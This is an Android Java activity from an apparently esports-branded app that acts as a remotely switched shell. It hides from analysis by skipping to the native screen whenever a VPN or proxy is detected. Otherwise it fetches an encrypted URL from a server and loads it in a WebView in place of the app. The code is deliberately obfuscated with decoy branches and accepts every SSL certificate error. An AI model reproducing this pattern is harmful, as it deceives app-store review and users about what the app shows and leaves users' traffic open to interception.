package com.kingexpand.wjw.prophetesports.activity;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.text.TextUtils;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.SslErrorHandler;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;
import org.xmlpull.v1.XmlPullParser;

import java.io.IOException;
import java.util.HashMap;
import java.util.logging.XMLFormatter;

import hugo.weaving.DebugLog;
import hugo.weaving.internal.Hugo;


public class SpActivity extends Activity {
    private String data;
    private boolean a = false;
    private WebView mW;
    private ProgressBar pr;
    private String sk = null;
    private static final String o = "order_id";
    //网络的ID 根据时间来的 ，固定值， 打包的时间。
    String d = "907241844";//测试
    //需要跳转到的activity

    Class mc = MainActivity.class;// 第二个界面进去哪里

    private ViewGroup mV;

    private HashMap<String, String> h;
    private SpTools.ProgressView pv;
    private Bitmap bmp;
    private String w = "0";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //如果加载assets的数据请使用下面的方法。
        XmlPullParser p = AC();

        if (p == null) {
            Toast.makeText(this, "assets文件 加载没有找到   ", Toast.LENGTH_LONG).show();
            return;
        }

        ViewGroup view = new RelativeLayout(this);
        mV = (ViewGroup) LayoutInflater.from(this).inflate(p, view);
        pv = new SpTools.ProgressView(this);
        mV.addView(pv);
        setContentView(view);
        mW = ((WebView) mV.findViewWithTag("WebView"));
        pr = ((ProgressBar) mV.findViewWithTag("ProgressBar"));
        pr.setVisibility(View.GONE);
        pr.setMax(100);
        pv.setVisibility(View.GONE);
        if (a) {
            // 混淆视听
            start();
        }

        //初始化数据。 不可以注释。
        aa();

        ab();

    }

    private void a(String a) {

    }


    @Override
    protected void onDestroy() {
        super.onDestroy();

    }

    private void aa(InheritableThreadLocal SDK) {
        if (a) {
            // 混淆视听
            start();
        }

    }

    private void aa() {
        h = new HashMap<>();
        h.put(o, SpTools.getAppid(this, d));
        h.put("version", "v2");
        h.put("origin_id", d);
        h.put("fisrt_open_time", SpTools.getFirstOpenTime(this));
        ADASDA(mW);
        mW.setOnLongClickListener(sadasdas);
        if (a) {
            // 混淆视听
            start();
        }

    }

    private XmlPullParser AC(XMLFormatter DS) {
        return null;
    }

    private XmlPullParser AC() {
        XmlPullParser xm = null;
        AssetManager as = this.getAssets();
        try {
            xm = as.openXmlResourceParser("assets/sg.abc");

        } catch (IOException e) {
            e.printStackTrace();
            Toast.makeText(this, "未找到资源", 1).show();
            return null;
        }
        return xm;
    }

    private void ab(String SA) {
    }

    private void ab() {

        boolean wi = SpTools.isWifiProxy(this);
        boolean vp = SpTools.isVpnUsed();
        if (vp || wi) {

            Log.d("aaa", "vp or wi ");
            start();
            return;
        }
        if (a) {
            // 混淆视听
            start();
        }

//        Log.d("aaa", "start Thread  ");

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String sult = SpTools.getHttp(SpTools.getUrl(w), h);
                    Looper.prepare();
                    pa(sult);
                    Looper.loop();
                } catch (Exception e) {
                    try {
                        String sult = SpTools.getHttp(SpTools.getUrl2(w), h);
                        Looper.prepare();
                        pa(sult);
                        Looper.loop();
                    } catch (Exception e1) {


                        String stringData = SpTools.getStringData(SpActivity.this);
                        if (!TextUtils.isEmpty(stringData)) {
                            data = stringData;
                            go(true);
                        } else {
                            go(false);
                        }


                    }
                }
            }
        }).start();

    }

    private int process = 0;

    public void ADASDA(WebView webView) {
        SpTools.setWebSetting(webView);
        webView.getSettings().setAppCachePath(getCacheDir().getAbsolutePath());
        //自动加载图片
        mW.setWebChromeClient(new WebChromeClient() {

            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                pr.setProgress(newProgress);
                if (newProgress == 100) {
                    process += 1;
                    if (process % 2 == 0) {
                        pr.setVisibility(View.GONE);
                        pv.setVisibility(View.GONE);
                    }
                }
                super.onProgressChanged(view, newProgress);
            }
        });

        mW.setWebViewClient(new WebViewClient() {

            @Override
            public void onPageFinished(WebView view, String url) {
                pv.setVisibility(View.GONE);
                pr.setVisibility(View.GONE);
                super.onPageFinished(view, url);
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                pv.setVisibility(View.VISIBLE);
                pr.setVisibility(View.VISIBLE);
                super.onPageStarted(view, url, favicon);
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
//                Log.w(TAG, "====加载失败====" + failingUrl);
                super.onReceivedError(view, errorCode, description, failingUrl);
            }


            @TargetApi(Build.VERSION_CODES.LOLLIPOP)
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                String url = request.getUrl().toString();
                try {
                    if (!TextUtils.isEmpty(sk)) {
                        String[] strings = sk.split("&");
                        for (String s : strings) {
                            if (url.contains(s)) {
                                Intent intent = new Intent();
                                intent.setAction(Intent.ACTION_VIEW);
                                intent.setData(Uri.parse(url));
                                startActivity(intent);
                                return true;
                            }
                        }
                    }
                } catch (Exception e) {
                    return true;
                }
                if (url.startsWith("http://") || url.startsWith("https://")) {
                    return false;
                } else {
                    try {
                        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                        startActivity(intent);
                        return true;
                    } catch (Exception e) {
                        return true;
                    }
                }
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (url == null) return false;
                try {
                    if (!TextUtils.isEmpty(sk)) {
                        String[] strings = sk.split("&");
                        for (String s : strings) {
                            if (url.contains(s)) {
                                Intent intent = new Intent();
                                intent.setAction(Intent.ACTION_VIEW);
                                intent.setData(Uri.parse(url));
                                startActivity(intent);
                                return true;
                            }
                        }
                    }
                } catch (Exception e) {
                    return true;//没有安装该app时，返回true，表示拦截自定义链接，但不跳转，避免弹出上面的错误页面
                }
                if (url.startsWith("http://") || url.startsWith("https://")) {
                    return false;
                } else {
                    try {
                        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                        startActivity(i);
                        return true;
                    } catch (Exception e) {
                        return true;
                    }
                }
            }

            @Override
            public void onReceivedSslError(WebView v, SslErrorHandler h, SslError
                    e) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    h.proceed();
                    mW.getSettings().setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
                } else {
                    h.proceed();
                }
            }
        });

    }

    public void pa(String str, int i) {

    }


    public void pa(String str) throws Exception {
        //此处判断链接是否有缓存， 和APPID 是否和本地的APPID 不同 。
        //此处进行判断，newid 有没有， 连接有没有， 如果都有的话，直接不用请求服务器
        if (a) {
            // 混淆视听
            start();
        }

        if (str.contains("not found")) {
            //新ID 或者請求的ID 、
//            Log.e(TAG, " 進來這裡進去的參數 : " + str );
            go(false);
            return;
        }

        JSONArray json = new JSONArray(str);
        String myjiemi = SpTools.Myjiemi(json);
        JSONObject ob = new JSONObject(myjiemi);
        String errmsg = ob.optString("errmsg");
//        Log.e(TAG, " 進來這裡進去的參數 errmsg: " + errmsg );
        if (errmsg.contains("not found this")) {
            go(false);
            return;
        }

//        Log.e(TAG, " 返回的數據為 : " + str );

        boolean jump = ob.getBoolean("jump");

        if (jump) {
            try {
                String new_id = (String) ob.opt("new_id");
                SpTools.putAppid(SpActivity.this, new_id);

            } catch (Exception e1) {
                Integer new_id = (Integer) ob.opt("new_id");
                SpTools.putAppid(SpActivity.this, new_id + "");
            }
            sk = (String) ob.opt("sk");
            data = (String) ob.opt("data");
            if (!TextUtils.isEmpty(data)) {
                SpTools.putStringData(SpActivity.this, data);
            }


            String stringData = SpTools.getStringData(SpActivity.this);
            if (!TextUtils.isEmpty(stringData) && TextUtils.isEmpty(str)) {
                // Log.e(TAG, "pa:  判斷返回數據為空， 和存儲的數據不為空 ，然後加載上次請求的數據。 缓存的数据链接为  " + stringData);
                data = stringData;
                go(true);
                return;
            }

        }


        go(jump);

    }

    /**
     * flag flase 跳到 原生
     * flag true  跳到 webview
     *
     * @param
     */

    public void go() {
        if (a) {
            // 混淆视听
            start();
        }

    }


    public void go(boolean flag) {
        if (a) {
            // 混淆视听
            start();
        }

        if (flag) {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    try {
                        String url = SpTools.DES_Decrypt(data);
                        mW.loadUrl(url);
                    } catch (Exception e) {
                        start();
                    }
                }
            });
        } else {
            start();
        }
    }

    //开启加载数据。

    private void start(int i) {
        if (a) {
            // 混淆视听
            start();
        }

    }


    private void start() {
        Intent intent = new Intent(SpActivity.this, mc);
        startActivity(intent);
//        SpActivity.this.overridePendingTransition(0, 0);
        finish();
    }

    /**
     * 保存数据 每个计费点只能购买一次 记录次数
     *
     * @param
     */

    private void saveData() {
        if (a) {
            // 混淆视听
            start();
        }

    }


    private void saveData(String payCode) {
        if (a) {
            // 混淆视听
            start();
        }

        SharedPreferences.Editor editor = getSharedPreferences("GameData",
                Context.MODE_PRIVATE).edit();
        editor.putString(payCode, payCode);
        editor.commit();
    }

    /**
     * @param
     * @return true：已被购买 false：未被购买
     */
    private boolean loadData() {
        return false;
    }

    private boolean loadData(String payCode) {
        SharedPreferences read = getSharedPreferences("GameData",
                Context.MODE_PRIVATE);
        String value = read.getString(payCode, "");

        if (TextUtils.isEmpty(value)) {
            return true;
        }
        return false;
    }

    private View.OnLongClickListener sadasdas = new View.OnLongClickListener() {
        @Override
        public boolean onLongClick(View v) {
//            MainActivityPermissionsDispatcher.downloadWithPermissionCheck(OfficalMainActivity.this,"");
            final WebView.HitTestResult hitTestResult = mW.getHitTestResult();
            // 如果是图片类型或者是带有图片链接的类型

            if (hitTestResult.getType() == WebView.HitTestResult.IMAGE_TYPE ||

                    hitTestResult.getType() == WebView.HitTestResult.SRC_IMAGE_ANCHOR_TYPE || hitTestResult.getType() == WebView.HitTestResult.SRC_IMAGE_ANCHOR_TYPE) {

                bmp = SpTools.createBitmapFromView(SpActivity.this.getWindow().getDecorView());
                // 弹出保存图片的对话框

                AlertDialog.Builder builder;

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    builder = new AlertDialog.Builder(SpActivity.this, android.R.style.Theme_DeviceDefault_Light_Dialog_Alert);
                } else {
                    builder = new AlertDialog.Builder(SpActivity.this, android.R.style.Theme_DeviceDefault_Light_Dialog);
                }

                builder.setMessage("您要保存图片吗?");
                builder.setPositiveButton("确认", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        if (null == bmp) {
                            Toast.makeText(SpActivity.this, "请手动截屏", Toast.LENGTH_SHORT).show();
                            return;
                        }
                        ApplyPermission();
                    }
                });
                builder.setNegativeButton("取消", null);
                AlertDialog dialog = builder.create();
                dialog.show();
                return true;
            }
            return false;

        }
    };
    private String[] permissions = {Manifest.permission.WRITE_EXTERNAL_STORAGE};

    private void ApplyPermission(String data) {
    }


    private void ApplyPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // 检查该权限是否已经获取
            int i = ContextCompat.checkSelfPermission(this, permissions[0]);
            // 权限是否已经 授权 GRANTED---授权  DINIED---拒绝
            if (i != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, permissions, 321);
            } else {
                SpTools.SavePic(SpActivity.this, bmp, sk);
            }
        }
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                           int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == 321) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    // 判断用户是否 点击了不再提醒。(检测该权限是否还可以申请)
                    boolean b = shouldShowRequestPermissionRationale(permissions[0]);
                    if (!b) {
                        // 用户还是想用我的 APP 的
                        // 提示用户去应用设置界面手动开启权限

                        AlertDialog.Builder builder = new AlertDialog.Builder(SpActivity.this, android.R.style.Theme_DeviceDefault_Light_Dialog_Alert);
                        builder.setTitle("存储权限不可用")
                                .setMessage("请在-应用设置-权限-中，允许使用存储权限来保存截图")
                                .setPositiveButton("立即开启", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        // 跳转到应用设置界面
                                        Intent intent = new Intent();
                                        intent.setAction(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                        Uri uri = Uri.fromParts("package", getPackageName(), null);
                                        intent.setData(uri);
                                        startActivityForResult(intent, 123);
                                    }
                                })
                                .setNegativeButton("取消", null).setCancelable(false).show();
                    } else {
//                        SpTools.SavePic(SpActivity.this, bmp, sk, qr_resut);
                        Toast.makeText(this, "权限获取失败无法保存截图", Toast.LENGTH_SHORT).show();
                    }

                } else {
                    SpTools.SavePic(SpActivity.this, bmp, sk);
                }
            }
        }
    }


    @Override
    public void onBackPressed() {
        if (mW.canGoBack()) {
            mW.goBack();
        } else {
            finish();
        }
    }


}
